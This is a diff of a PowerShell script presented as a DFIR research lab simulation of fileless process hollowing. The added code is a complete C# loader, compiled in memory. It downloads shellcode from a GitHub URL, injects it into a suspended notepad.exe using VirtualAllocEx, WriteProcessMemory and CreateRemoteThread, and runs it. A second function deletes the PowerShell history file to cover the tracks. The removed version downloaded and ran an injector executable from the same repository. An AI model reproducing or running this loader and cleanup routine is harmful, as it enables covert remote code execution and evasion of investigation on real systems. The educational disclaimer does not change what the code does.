@@ -1,58 +1,182 @@
-# DFIR Lab Simulation Script
-# This script simulates the initial stage of a Process Hollowing attack.
+<#
+    PROJECT: Fileless Process Hollowing Simulation
+    PURPOSE: DFIR Research Lab - Artifact Generation
+    AUTHOR: [Your Name]
+    
+    DISCLAIMER: For educational and defensive research purposes only.
+#>
 
-# --- Configuration Variables ---
-# NOTE: Ensure the file names below match what you uploaded to your main branch
-$repo = "https://raw.githubusercontent.com/stumbs/NotePadInjection/main"
-$hollow_exe = "hollow.exe"
-$payload_bin = "payload.bin"
-$temp_dir = "$env:TEMP" # Downloads will go to C:\Users\<Username>\AppData\Local\Temp
+# --- CONFIGURATION ---
+# [IMPORTANT] Replace this URL with the RAW GitHub link to your payload.bin
+$PayloadUrl = "https://raw.githubusercontent.com/stumbs/NotePadInjection/main/payload.bin"
 
-Write-Host "[*] Starting Attack Simulation for DFIR Lab..." -ForegroundColor Green
-Write-Host "----------------------------------------------------" -ForegroundColor Green
 
-# 1. Download Attacker Tools (Artifacts Creation)
-Write-Host "[*] Downloading hollowing loader and payload from GitHub..." -ForegroundColor Yellow
+# --- PART 1: THE C# LOADER (The Engine) ---
+# This block defines the Windows API calls we need to access memory directly.
+$Code = @"
+using System;
+using System.Runtime.InteropServices;
+using System.Net;
 
-# Download the C++ injector executable
-Invoke-WebRequest -Uri "$repo/$hollow_exe" -OutFile "$temp_dir\$hollow_exe" -Verbose
-# Download the raw binary shellcode payload
-Invoke-WebRequest -Uri "$repo/$payload_bin" -OutFile "$temp_dir\$payload_bin" -Verbose
+public class FilelessLoader {
+    
+    // --- P/Invoke Definitions (The Bridge to the Windows Kernel) ---
+    
+    [DllImport("kernel32.dll")]
+    public static extern bool CreateProcess(
+        string lpApplicationName, 
+        string lpCommandLine, 
+        IntPtr lpProcessAttributes, 
+        IntPtr lpThreadAttributes, 
+        bool bInheritHandles, 
+        uint dwCreationFlags, 
+        IntPtr lpEnvironment, 
+        string lpCurrentDirectory, 
+        ref STARTUPINFO lpStartupInfo, 
+        out PROCESS_INFORMATION lpProcessInformation
+    );
 
-Write-Host "[+] Files downloaded to $temp_dir" -ForegroundColor Green
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAllocEx(
+        IntPtr hProcess, 
+        IntPtr lpAddress, 
+        uint dwSize, 
+        uint flAllocationType, 
+        uint flProtect
+    );
 
-# 2. Execute Hollowing Loader
-Write-Host " "
-Write-Host "[*] Executing **Hollowing Loader** to inject into Notepad.exe..." -ForegroundColor Yellow
+    [DllImport("kernel32.dll")]
+    public static extern bool WriteProcessMemory(
+        IntPtr hProcess, 
+        IntPtr lpBaseAddress, 
+        byte[] lpBuffer, 
+        uint nSize, 
+        out IntPtr lpNumberOfBytesWritten
+    );
 
-# This command executes the hollowing program:
-# -FilePath: Specifies the injector program (hollow.exe)
-# -ArgumentList: Passes the path to the payload (payload.bin) to the injector
-# -NoNewWindow: Ensures the C++ output appears in this PowerShell window
-# -Wait: Pauses the script until hollow.exe finishes or crashes
-Start-Process -FilePath "$temp_dir\$hollow_exe" -ArgumentList "$temp_dir\$payload_bin" -NoNewWindow -Wait
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateRemoteThread(
+        IntPtr hProcess, 
+        IntPtr lpThreadAttributes, 
+        uint dwStackSize, 
+        IntPtr lpStartAddress, 
+        IntPtr lpParameter, 
+        uint dwCreationFlags, 
+        IntPtr lpThreadId
+    );
 
-Write-Host " "
+    // --- Data Structures Required by Windows APIs ---
 
-# 3. DFIR Analysis Break Point (Pause)
-Write-Host "====================================================" -ForegroundColor Cyan
-Write-Host "**!!! DFIR INVESTIGATION PHASE !!!**" -ForegroundColor Cyan
-Write-Host "The injection process has completed (successfully or not)." -ForegroundColor Cyan
-Write-Host "Your **Notepad.exe** process should now be running the autoclicker payload." -ForegroundColor Cyan
-Write-Host " " -ForegroundColor Cyan
-Write-Host "Tasks to perform NOW (before cleanup):" -ForegroundColor Cyan
-Write-Host " - Analyze the running Notepad process (PID) using Process Hacker/Explorer." -ForegroundColor Cyan
-Write-Host " - Dump the process memory and analyze the injected shellcode." -ForegroundColor Cyan
-Write-Host " - Search for the downloaded files in the $temp_dir folder." -ForegroundColor Cyan
-Write-Host "====================================================" -ForegroundColor Cyan
-Read-Host -Prompt "Press Enter to delete the artifacts and finish the simulation cleanup..."
+    [StructLayout(LayoutKind.Sequential)]
+    public struct STARTUPINFO { 
+        public uint cb; 
+    }
 
-# 4. Cleanup Artifacts (Anti-Forensics Step)
-Write-Host " "
-Write-Host "[*] **Anti-Forensics:** Cleaning up downloaded artifacts..." -ForegroundColor Red
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION { 
+        public IntPtr hProcess; 
+        public IntPtr hThread; 
+        public int dwProcessId; 
+        public int dwThreadId; 
+    }
 
-# Delete the downloaded executable and payload
-Remove-Item "$temp_dir\$hollow_exe" -Force
-Remove-Item "$temp_dir\$payload_bin" -Force
+    // --- The Main Logic ---
+    public static void Execute(string url) {
+        try {
+            Console.WriteLine("[*] Fetching payload from GitHub (Memory Only)...");
+            
+            // 1. Download the Payload
+            // Use TLS 1.2 to ensure connection to GitHub works
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+            WebClient wc = new WebClient();
+            byte[] shellcode = wc.DownloadData(url);
+            
+            if (shellcode.Length == 0) {
+                Console.WriteLine("[-] Download failed. Check URL.");
+                return;
+            }
 
-Write-Host "[+] Simulation Complete. Downloaded files removed." -ForegroundColor Green
+            Console.WriteLine("[*] Starting Notepad in Suspended State...");
+            STARTUPINFO si = new STARTUPINFO();
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+            
+            // 2. Create the Victim Process (Notepad)
+            // 0x4 = CREATE_SUSPENDED flag
+            bool success = CreateProcess(@"C:\Windows\System32\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+            
+            if (!success) { 
+                Console.WriteLine("[-] Failed to create process."); 
+                return; 
+            }
+
+            Console.WriteLine("[*] Allocating RWX Memory in Notepad (PID: " + pi.dwProcessId + ")...");
+            
+            // 3. Allocate Memory
+            // 0x3000 = MEM_COMMIT | MEM_RESERVE
+            // 0x40 = PAGE_EXECUTE_READWRITE (This is the forensic red flag!)
+            IntPtr remoteMem = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
+
+            Console.WriteLine("[*] Injecting Shellcode...");
+            
+            // 4. Copy the Payload
+            IntPtr bytesWritten;
+            WriteProcessMemory(pi.hProcess, remoteMem, shellcode, (uint)shellcode.Length, out bytesWritten);
+
+            Console.WriteLine("[*] Detonating Payload via Remote Thread...");
+            
+            // 5. Execute
+            CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, remoteMem, IntPtr.Zero, 0, IntPtr.Zero);
+            
+            Console.WriteLine("[+] Success! Payload is running inside Notepad.");
+        }
+        catch (Exception e) {
+            Console.WriteLine("[-] Error: " + e.Message);
+        }
+    }
+}
+"@
+
+
+# --- PART 2: ANTI-FORENSICS (The Cleaner) ---
+function Invoke-StealthCleanup {
+    Write-Host "`n[*] Initiating Anti-Forensic Cleanup..." -ForegroundColor Yellow
+
+    # 1. Stop recording new commands to the history file
+    # This releases the file lock so we can delete it.
+    Set-PSReadlineOption -HistorySaveStyle SaveNothing
+
+    # 2. Find the history file path
+    $HistoryPath = (Get-PSReadlineOption).HistorySavePath
+    
+    # 3. Delete the file
+    if (Test-Path $HistoryPath) {
+        try {
+            Remove-Item -Path $HistoryPath -Force -ErrorAction SilentlyContinue
+            Write-Host "[+] Artifact Deleted: PowerShell History file wiped." -ForegroundColor Green
+        }
+        catch {
+            Write-Host "[-] Cleanup Failed: File locked or permission denied." -ForegroundColor Red
+        }
+    } else {
+        Write-Host "[!] No history file found (Already clean?)." -ForegroundColor DarkGray
+    }
+}
+
+
+# --- PART 3: EXECUTION CHAIN ---
+
+# A. Compile the C# Loader into RAM
+Write-Host "[*] Compiling Loader in Memory..." -ForegroundColor Cyan
+try {
+    Add-Type -TypeDefinition $Code -Language CSharp
+}
+catch {
+    Write-Error "Compilation Failed. Check for syntax errors."
+    exit
+}
+
+# B. Run the Attack
+[FilelessLoader]::Execute($PayloadUrl)
+
+# C. Wipe the Tracks
+Invoke-StealthCleanup
